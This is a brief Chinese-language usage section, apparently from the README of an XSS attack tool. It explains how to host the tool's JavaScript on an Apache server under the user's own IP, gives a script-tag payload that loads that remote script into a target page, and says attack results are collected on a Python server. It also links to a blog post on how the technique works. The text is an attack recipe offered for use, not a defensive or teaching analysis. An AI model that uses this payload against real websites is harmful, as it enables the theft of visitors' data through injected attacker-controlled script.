## XSS工具用法
将js下的文件夹保存到apache的目录下，然后修改其中js文件的ip地址为你的实际ip地址。
同时你的payload为：
```js
<script src="http://{你的ip地址}:{你的apache端口，一般为80可以不填写}/N"></script>
```
然后直接访问你的python服务器即可获取XSS攻击结果。
原理可以在这看到：https://www.cnblogs.com/9man/p/18292753
